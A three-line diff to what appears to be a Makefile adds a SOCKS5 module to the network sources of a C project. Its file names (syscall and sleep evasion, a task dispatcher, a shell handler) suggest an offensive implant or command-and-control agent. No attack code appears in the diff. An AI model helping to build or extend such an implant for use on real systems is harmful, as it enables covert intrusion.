@@ -47,7 +47,8 @@ EVASION_SRC = $(SRC_DIR)/evasion/syscalls.c \
               $(SRC_DIR)/evasion/sleep.c
 
 NETWORK_SRC = $(SRC_DIR)/network/transport.c \
-              $(SRC_DIR)/network/profile.c
+              $(SRC_DIR)/network/profile.c \
+              $(SRC_DIR)/network/socks5.c
 
 TASKS_SRC = $(SRC_DIR)/tasks/dispatcher.c \
             $(SRC_DIR)/tasks/handlers/shell.c \
